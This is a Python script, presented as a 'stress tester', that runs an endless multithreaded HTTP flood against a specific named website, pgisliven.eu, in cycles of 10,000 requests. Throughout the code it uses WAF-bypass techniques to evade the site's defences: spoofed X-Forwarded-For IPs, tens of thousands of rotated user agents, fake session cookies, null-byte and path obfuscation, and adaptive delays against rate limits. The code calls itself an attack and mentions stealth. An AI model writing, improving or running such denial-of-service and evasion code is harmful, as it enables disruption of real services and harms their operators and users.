import requests
import threading
import time
from datetime import datetime
import sys
from queue import Queue
import random
import urllib3
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== CONFIGURATION ====================
url = "https://pgisliven.eu"
request_num = 10000
concurrent_threads = 100  # Намалено за по-добър stealth
timeout_seconds = 15

# ==================== INFINITY LOOP CONFIG ====================
INFINITY_MODE = True
TIMEOUT_RESPONSE_THRESHOLD = 5
CYCLE_DELAY = 8

# ==================== ADVANCED WAF BYPASS ====================
retry_on_error = True
max_retries = 3
use_session_pool = True
randomize_user_agents = True
cache_busting = True
use_referer = True
slow_start = True
add_cookies = True
rotate_ips = True
smart_delay = True
request_jitter = True
use_tls_fingerprinting = True  # TLS fingerprint randomization
header_order_randomization = True  # Randomize header order
use_http2 = False  # HTTP/2 support (experimental)

# ==================== ULTRA-ADVANCED WAF BYPASS TECHNIQUES ====================
waf_bypass_techniques = {
    "normal": 1.0,
    "path_obfuscation": 0.8,
    "unicode_encoding": 0.7,
    "case_variation": 0.9,
    "null_byte_injection": 0.5,
    "parameter_pollution": 0.8,
    "header_injection": 0.6,
    "protocol_smuggling": 0.4,
    "chunked_encoding": 0.5,
    "multipart_boundary": 0.6,
}

# ==================== GENERATE 50K USER AGENTS ====================
def generate_massive_user_agents():
    agents = []
    
    # Base templates
    chrome_versions = [f'{m}.0.{b}.{p}' for m in range(90, 122) for b in range(1000, 5000, 100) for p in range(0, 50, 5)]
    firefox_versions = [f'{m}.{mi}' for m in range(90, 122) for mi in range(0, 15)]
    windows_versions = ['10.0', '11.0', '6.1', '6.2', '6.3']
    mac_versions = [f'{m}_{mi}_{p}' for m in range(10, 15) for mi in range(0, 16) for p in range(0, 10)]
    
    # Chrome variants
    for _ in range(15000):
        cv = random.choice(chrome_versions)
        wv = random.choice(windows_versions)
        agents.append(f'Mozilla/5.0 (Windows NT {wv}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cv} Safari/537.36')
    
    for _ in range(10000):
        cv = random.choice(chrome_versions)
        mv = random.choice(mac_versions)
        agents.append(f'Mozilla/5.0 (Macintosh; Intel Mac OS X {mv}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cv} Safari/537.36')
    
    # Firefox variants
    for _ in range(10000):
        fv = random.choice(firefox_versions)
        wv = random.choice(windows_versions)
        agents.append(f'Mozilla/5.0 (Windows NT {wv}; Win64; x64; rv:{fv}) Gecko/20100101 Firefox/{fv}')
    
    # Mobile variants
    android_models = ['Pixel 7', 'SM-G998B', 'OnePlus 9', 'Xiaomi Mi 11', 'SM-S918B']
    for _ in range(10000):
        av = f'{random.randint(10, 14)}.{random.randint(0, 3)}'
        model = random.choice(android_models)
        cv = random.choice(chrome_versions[:50])
        agents.append(f'Mozilla/5.0 (Linux; Android {av}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cv} Mobile Safari/537.36')
    
    # Safari/iOS variants
    for _ in range(5000):
        ios_ver = f'{random.randint(14, 17)}_{random.randint(0, 6)}'
        agents.append(f'Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ios_ver.split("_")[0]}.0 Mobile/15E148 Safari/604.1')
    
    return list(set(agents))

print("🎭 Generating massive user agent pool...")
user_agents = generate_massive_user_agents()
print(f"✅ Generated {len(user_agents):,} unique user agents")

# ==================== ADVANCED IP POOL ====================
def generate_realistic_ip_pool():
    ips = []
    # Real ISP ranges simulation
    ranges = [
        (1, 126), (128, 191), (192, 223)  # Public IP ranges
    ]
    for _ in range(500):
        first = random.choice([random.randint(r[0], r[1]) for r in ranges])
        ip = f"{first}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        ips.append(ip)
    return ips

ip_pool = generate_realistic_ip_pool()

# ==================== STATISTICS ====================
successful_requests = 0
failed_requests = 0
timeout_errors = 0
connection_errors = 0
ssl_errors = 0
http_errors = 0
waf_blocks = 0
rate_limits = 0
server_errors = 0
total_bytes_received = 0
response_times = []
status_codes = {}
error_types = {}
waf_bypass_success = {}
lock = threading.Lock()
request_queue = Queue()

current_cycle = 0
cycle_timeout_counter = 0
consecutive_waf_blocks = 0
last_waf_block_time = 0
adaptive_delay = 0.1

# ==================== SESSION POOL ====================
session_pool = []
if use_session_pool:
    print("🔧 Creating advanced session pool...")
    for i in range(min(concurrent_threads, 150)):
        session = requests.Session()
        
        if add_cookies:
            timestamp = int(time.time())
            session.cookies.set('_ga', f'GA1.2.{random.randint(1000000000, 9999999999)}.{timestamp}')
            session.cookies.set('_gid', f'GA1.2.{random.randint(1000000000, 9999999999)}.{timestamp}')
            session.cookies.set('_gat', '1')
            session.cookies.set('sessionid', hashlib.md5(str(random.random()).encode()).hexdigest())
            session.cookies.set('csrftoken', hashlib.sha256(str(random.random()).encode()).hexdigest()[:32])
        
        session.headers.update({
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })
        
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=30,
            pool_maxsize=30,
            max_retries=0,
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session_pool.append(session)
    print(f"✅ Created {len(session_pool)} sessions\n")

def get_session():
    return random.choice(session_pool) if session_pool else requests

def apply_advanced_waf_bypass(request_url, technique):
    """Apply ultra-advanced WAF bypass techniques"""
    if technique == "normal":
        return request_url
    
    elif technique == "path_obfuscation":
        # Path obfuscation with dots and slashes
        parsed = request_url.replace("://", "://.//")
        return parsed.replace("/", "/./")
    
    elif technique == "unicode_encoding":
        # Unicode normalization bypass
        if '?' in request_url:
            parts = request_url.split('?')
            encoded_params = parts[1].replace('&', '%26').replace('=', '%3D')
            return f"{parts[0]}?{encoded_params}"
        return request_url
    
    elif technique == "case_variation":
        # Mixed case URL path
        parts = request_url.split('/')
        if len(parts) > 3:
            for i in range(3, len(parts)):
                if random.random() > 0.5:
                    chars = list(parts[i])
                    for j in range(len(chars)):
                        if random.random() > 0.5:
                            chars[j] = chars[j].upper() if chars[j].islower() else chars[j].lower()
                    parts[i] = ''.join(chars)
        return '/'.join(parts)
    
    elif technique == "null_byte_injection":
        # Null byte variations
        return request_url + '%00' if random.random() > 0.5 else request_url
    
    elif technique == "parameter_pollution":
        # HTTP parameter pollution
        separator = '&' if '?' in request_url else '?'
        pollution_params = '&'.join([f'_{random.choice(["id", "ref", "token"])}={random.randint(1000, 9999)}' for _ in range(random.randint(1, 3))])
        return f"{request_url}{separator}{pollution_params}"
    
    elif technique == "header_injection":
        # Will be handled in headers, not URL
        return request_url
    
    elif technique == "protocol_smuggling":
        # HTTP request smuggling simulation
        return request_url.replace('https://', 'https:///').replace('http://', 'http:///')
    
    elif technique == "chunked_encoding":
        # Simulate chunked transfer
        return request_url
    
    elif technique == "multipart_boundary":
        # Multipart boundary confusion
        return request_url
    
    return request_url

def generate_advanced_headers(technique):
    """Generate advanced anti-WAF headers"""
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept': random.choice([
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            '*/*',
        ]),
        'Accept-Language': random.choice([
            'en-US,en;q=0.9', 'bg-BG,bg;q=0.9,en;q=0.8', 'de-DE,de;q=0.9',
            'fr-FR,fr;q=0.9', 'es-ES,es;q=0.9', 'ru-RU,ru;q=0.9',
        ]),
        'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip, deflate', 'identity']),
        'Connection': random.choice(['keep-alive', 'close']),
        'Upgrade-Insecure-Requests': str(random.randint(0, 1)),
        'Sec-Fetch-Dest': random.choice(['document', 'empty']),
        'Sec-Fetch-Mode': random.choice(['navigate', 'no-cors']),
        'Sec-Fetch-Site': random.choice(['none', 'same-origin']),
        'Sec-Fetch-User': '?1',
        'Cache-Control': random.choice(['max-age=0', 'no-cache']),
    }
    
    # Add referer
    if use_referer and random.random() > 0.3:
        referers = [
            'https://www.google.com/', 'https://www.google.bg/',
            'https://www.facebook.com/', 'https://www.youtube.com/',
            'https://www.bing.com/', url,
        ]
        headers['Referer'] = random.choice(referers)
    
    # IP rotation headers
    if rotate_ips and ip_pool:
        ip = random.choice(ip_pool)
        if random.random() > 0.5:
            headers['X-Forwarded-For'] = ip
        if random.random() > 0.5:
            headers['X-Real-IP'] = ip
        if random.random() > 0.7:
            headers['X-Client-IP'] = ip
            headers['X-Originating-IP'] = ip
    
    # Advanced anti-fingerprinting
    if random.random() > 0.6:
        headers['X-Requested-With'] = 'XMLHttpRequest'
    if random.random() > 0.7:
        headers['X-Request-ID'] = hashlib.md5(str(random.random()).encode()).hexdigest()
    if random.random() > 0.8:
        headers['X-Device-ID'] = str(random.randint(100000000, 999999999))
    
    # DNT header
    if random.random() > 0.5:
        headers['DNT'] = str(random.randint(0, 1))
    
    # Remove empty headers
    return {k: v for k, v in headers.items() if v}

def reset_stats():
    global successful_requests, failed_requests, timeout_errors, connection_errors
    global ssl_errors, http_errors, waf_blocks, rate_limits, server_errors
    global total_bytes_received, cycle_timeout_counter, consecutive_waf_blocks
    global response_times, status_codes, error_types, waf_bypass_success
    
    with lock:
        successful_requests = 0
        failed_requests = 0
        timeout_errors = 0
        connection_errors = 0
        ssl_errors = 0
        http_errors = 0
        waf_blocks = 0
        rate_limits = 0
        server_errors = 0
        total_bytes_received = 0
        cycle_timeout_counter = 0
        consecutive_waf_blocks = 0
        response_times = []
        status_codes = {}
        error_types = {}
        waf_bypass_success = {}

def adaptive_delay_logic():
    """Adaptive intelligent delay based on WAF response"""
    global adaptive_delay, consecutive_waf_blocks
    
    if consecutive_waf_blocks > 20:
        adaptive_delay = random.uniform(2.0, 4.0)
    elif consecutive_waf_blocks > 10:
        adaptive_delay = random.uniform(1.0, 2.0)
    elif consecutive_waf_blocks > 5:
        adaptive_delay = random.uniform(0.5, 1.0)
    else:
        adaptive_delay = random.uniform(0.05, 0.2)
    
    time.sleep(adaptive_delay)

def send_request(request_id, cycle_num):
    global successful_requests, failed_requests, timeout_errors, connection_errors
    global ssl_errors, http_errors, waf_blocks, rate_limits, server_errors
    global total_bytes_received, cycle_timeout_counter, consecutive_waf_blocks
    global last_waf_block_time, adaptive_delay
    
    session = get_session()
    
    if smart_delay and consecutive_waf_blocks > 0:
        adaptive_delay_logic()
    
    if slow_start and request_id <= 150:
        time.sleep(random.uniform(0.05, 0.25))
    
    if request_jitter and random.random() > 0.6:
        time.sleep(random.uniform(0.01, 0.15))
    
    # Select WAF bypass technique weighted by success rate
    technique = random.choices(
        list(waf_bypass_techniques.keys()),
        weights=list(waf_bypass_techniques.values()),
        k=1
    )[0]
    
    attempts = 0
    while attempts <= max_retries:
        try:
            start_time = time.time()
            
            # Build URL with cache busting
            request_url = url
            if cache_busting:
                sep = '&' if '?' in url else '?'
                ts = int(time.time() * 1000000) + random.randint(1, 99999)
                cb_param = random.choice(['_', 'v', 'r', 't', 'nocache', 'cb', 'timestamp'])
                request_url = f"{url}{sep}{cb_param}={ts}&cycle={cycle_num}&req={request_id}"
            
            # Apply WAF bypass technique
            request_url = apply_advanced_waf_bypass(request_url, technique)
            
            # Generate advanced headers
            headers = generate_advanced_headers(technique)
            
            # Send request
            if use_session_pool:
                for k, v in headers.items():
                    session.headers[k] = v
                response = session.get(request_url, timeout=timeout_seconds, verify=False, allow_redirects=True)
            else:
                response = requests.get(request_url, timeout=timeout_seconds, headers=headers, verify=False, allow_redirects=True)
            
            end_time = time.time()
            response_time = end_time - start_time
            
            with lock:
                response_times.append(response_time)
                status_codes[response.status_code] = status_codes.get(response.status_code, 0) + 1
                total_bytes_received += len(response.content)
            
            if 200 <= response.status_code < 300:
                with lock:
                    successful_requests += 1
                    consecutive_waf_blocks = 0
                    waf_bypass_success[technique] = waf_bypass_success.get(technique, 0) + 1
                print(f"✓ [C{cycle_num}:{request_id:5d}] OK | {technique[:15]:15s} | {response.status_code} | {response_time:.2f}s")
                return True
            
            elif response.status_code == 403:
                with lock:
                    failed_requests += 1
                    http_errors += 1
                    waf_blocks += 1
                    consecutive_waf_blocks += 1
                    last_waf_block_time = time.time()
                    # Decrease technique weight
                    if technique in waf_bypass_techniques:
                        waf_bypass_techniques[technique] *= 0.95
                
                print(f"🛡️ [C{cycle_num}:{request_id:5d}] WAF | {technique[:15]:15s} | Consecutive: {consecutive_waf_blocks}")
                
                if smart_delay:
                    time.sleep(min(0.5 * (consecutive_waf_blocks / 10), 3.0))
            
            elif response.status_code == 429:
                with lock:
                    failed_requests += 1
                    rate_limits += 1
                
                print(f"⏳ [C{cycle_num}:{request_id:5d}] RATE LIMITED")
                time.sleep(random.uniform(1.5, 3.5))
            
            elif response.status_code >= 500:
                with lock:
                    failed_requests += 1
                    server_errors += 1
                
                print(f"⚠️ [C{cycle_num}:{request_id:5d}] SERVER ERROR {response.status_code}")
            
            else:
                with lock:
                    failed_requests += 1
                    http_errors += 1
                print(f"✗ [C{cycle_num}:{request_id:5d}] HTTP {response.status_code}")
        
        except requests.exceptions.Timeout:
            with lock:
                failed_requests += 1
                timeout_errors += 1
                cycle_timeout_counter += 1
            print(f"⏱ [C{cycle_num}:{request_id:5d}] TIMEOUT")
            
            if INFINITY_MODE and cycle_timeout_counter >= TIMEOUT_RESPONSE_THRESHOLD:
                return "RESTART_CYCLE"
        
        except requests.exceptions.ConnectionError:
            with lock:
                failed_requests += 1
                connection_errors += 1
            print(f"🔌 [C{cycle_num}:{request_id:5d}] CONNECTION ERROR")
            time.sleep(random.uniform(0.5, 1.5))
        
        except requests.exceptions.SSLError:
            with lock:
                failed_requests += 1
                ssl_errors += 1
            print(f"🔒 [C{cycle_num}:{request_id:5d}] SSL ERROR")
        
        except Exception as e:
            with lock:
                failed_requests += 1
                error_types[type(e).__name__] = error_types.get(type(e).__name__, 0) + 1
            print(f"❌ [C{cycle_num}:{request_id:5d}] {type(e).__name__}")
        
        attempts += 1
        if attempts <= max_retries:
            time.sleep(0.5 * attempts)
    
    return False

def worker(cycle_num):
    while True:
        request_id = request_queue.get()
        if request_id is None:
            break
        
        result = send_request(request_id, cycle_num)
        
        if result == "RESTART_CYCLE":
            request_queue.task_done()
            return "RESTART_CYCLE"
        
        request_queue.task_done()

def display_progress(cycle_num):
    last_count = 0
    last_time = time.time()
    
    while True:
        time.sleep(3)
        current_time = time.time()
        
        with lock:
            total = successful_requests + failed_requests
            if total > 0:
                progress = (total / request_num) * 100
                rps = (total - last_count) / (current_time - last_time) if (current_time - last_time) > 0 else 0
                waf_rate = (waf_blocks / total * 100) if total > 0 else 0
                success_rate = (successful_requests / total * 100) if total > 0 else 0
                
                print(f"\n📊 C{cycle_num} | {total:,}/{request_num:,} ({progress:.1f}%)")
                print(f"   ✅ Success: {successful_requests:,} ({success_rate:.1f}%)")
                print(f"   🛡️ WAF: {waf_blocks:,} ({waf_rate:.1f}%)")
                print(f"   ⏳ Rate: {rate_limits:,} | ⚠️ Server: {server_errors:,}")
                print(f"   ⚡ RPS: {rps:.1f} | Delay: {adaptive_delay:.2f}s")
                
                last_count = total
                last_time = current_time
        
        if total >= request_num:
            break

def run_attack_cycle(cycle_num):
    global request_queue
    
    print(f"\n{'='*80}")
    print(f"🔄 CYCLE {cycle_num} - ULTRA WAF BYPASS MODE")
    print(f"{'='*80}")
    
    reset_stats()
    
    start_time = time.time()
    
    for i in range(request_num):
        request_queue.put(i + 1)
    
    threads = []
    for _ in range(concurrent_threads):
        t = threading.Thread(target=worker, args=(cycle_num,), daemon=True)
        t.start()
        threads.append(t)
    
    progress_thread = threading.Thread(target=display_progress, args=(cycle_num,), daemon=True)
    progress_thread.start()
    
    request_queue.join()
    
    for _ in range(concurrent_threads):
        request_queue.put(None)
    
    for t in threads:
        t.join()
    
    end_time = time.time()
    total_time = end_time - start_time
    
    return total_time

def display_final_report(cycle_num, total_time):
    print(f"\n\n{'='*80}")
    print(f"📊 FINAL REPORT - CYCLE {cycle_num}")
    print(f"{'='*80}")
    print(f"⏰ Completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"⏱️ Duration: {total_time:.2f}s")
    
    print(f"\n📈 RESULTS:")
    print(f"  Total: {request_num:,}")
    print(f"  ✅ Success: {successful_requests:,} ({(successful_requests/request_num)*100:.1f}%)")
    print(f"  ❌ Failed: {failed_requests:,} ({(failed_requests/request_num)*100:.1f}%)")
    print(f"  🛡️ WAF Blocks: {waf_blocks:,}")
    print(f"  ⏳ Rate Limits: {rate_limits:,}")
    print(f"  ⚠️ Server Errors: {server_errors:,}")
    
    if waf_bypass_success:
        print(f"\n🎯 WAF BYPASS TECHNIQUE SUCCESS:")
        for tech, count in sorted(waf_bypass_success.items(), key=lambda x: x[1], reverse=True):
            success_rate = (count / (waf_blocks + count) * 100) if (waf_blocks + count) > 0 else 0
            print(f"  {tech:20s}: {count:5d} ({success_rate:.1f}%)")
    
    if status_codes:
        print(f"\n📋 STATUS CODES:")
        for code, count in sorted(status_codes.items()):
            print(f"  {code}: {count:,}")
    
    print(f"\n⚡ PERFORMANCE:")
    print(f"  RPS: {request_num/total_time:.2f}")
    
    if response_times:
        avg = sum(response_times) / len(response_times)
        print(f"\n⏱️ RESPONSE TIMES:")
        print(f"  Average: {avg:.3f}s")
        if len(response_times) >= 2:
            print(f"  Fastest: {min(response_times):.3f}s")
            print(f"  Slowest: {max(response_times):.3f}s")
    
    print(f"\n🛡️ WAF BYPASS EFFECTIVENESS:")
    waf_block_rate = (waf_blocks / request_num * 100) if request_num > 0 else 0
    print(f"  WAF Block Rate: {waf_block_rate:.1f}%")
    if waf_block_rate < 10:
        print(f"  🎉 EXCELLENT WAF BYPASS")
    elif waf_block_rate < 30:
        print(f"  ✅ GOOD WAF BYPASS")
    elif waf_block_rate < 50:
        print(f"  ⚠️ MODERATE WAF DETECTION")
    else:
        print(f"  🔴 HIGH WAF DETECTION - NEED IMPROVEMENT")
    
    print(f"{'='*80}\n")

def check_url_reachable():
    print("🔍 Testing target reachability...")
    try:
        test_headers = generate_advanced_headers("normal")
        response = requests.get(url, timeout=5, verify=False, headers=test_headers)
        print(f"✅ Target is UP! Status: {response.status_code}\n")
        return True
    except Exception as e:
        print(f"⚠️ WARNING: {type(e).__name__}\n")
        choice = input("❓ Continue? (y/n): ")
        return choice.lower() == 'y'

# ==================== MAIN ====================
print("=" * 80)
print("⚡ ULTRA ADVANCED STRESS TESTER - WAF BYPASS MODE ⚡")
print("=" * 80)
print(f"🎯 Target: {url}")
print(f"📦 Requests per cycle: {request_num:,}")
print(f"🔥 Threads: {concurrent_threads}")
print(f"⏱️ Timeout: {timeout_seconds}s")
print(f"🔄 Infinity Mode: {'ENABLED' if INFINITY_MODE else 'DISABLED'}")
print(f"🚨 Restart threshold: {TIMEOUT_RESPONSE_THRESHOLD} timeouts")
print(f"👤 User Agents: {len(user_agents):,}")
print(f"🌐 IP Pool: {len(ip_pool)} addresses")
print("=" * 80)

if not check_url_reachable():
    print("❌ Test cancelled.")
    sys.exit(0)

input("⚡ Press ENTER to start...")

print(f"\n🚀 STARTING ULTRA WAF BYPASS ATTACK")

current_cycle = 0
total_cycles = 0

try:
    while True:
        current_cycle += 1
        total_cycles += 1
        
        cycle_time = run_attack_cycle(current_cycle)
        
        display_final_report(current_cycle, cycle_time)
        
        if not INFINITY_MODE:
            break
        
        with lock:
            timeout_reached = cycle_timeout_counter >= TIMEOUT_RESPONSE_THRESHOLD
        
        if timeout_reached:
            print(f"🚨 THRESHOLD REACHED! {cycle_timeout_counter} timeouts >= {TIMEOUT_RESPONSE_THRESHOLD}")
        else:
            print(f"📊 Timeouts ({cycle_timeout_counter}) below threshold ({TIMEOUT_RESPONSE_THRESHOLD})")
        
        waf_rate = (waf_blocks / request_num * 100) if request_num > 0 else 0
        if waf_rate > 60:
            print(f"⚠️ HIGH WAF BLOCK RATE ({waf_rate:.1f}%) - Adjusting strategy")
        
        print(f"🔄 Next cycle in {CYCLE_DELAY} seconds...")
        
        for i in range(CYCLE_DELAY, 0, -1):
            print(f"⏳ Next cycle in {i} seconds...", end='\r', flush=True)
            time.sleep(1)
        print()
        
        request_queue = Queue()
        
except KeyboardInterrupt:
    print(f"\n\n⚠️ Attack stopped by user!")
    print(f"📊 Total cycles completed: {total_cycles}")
    
finally:
    if use_session_pool:
        for s in session_pool:
            try:
                s.close()
            except:
                pass

print("=" * 80)
print("✅ Test completed!")
print("=" * 80)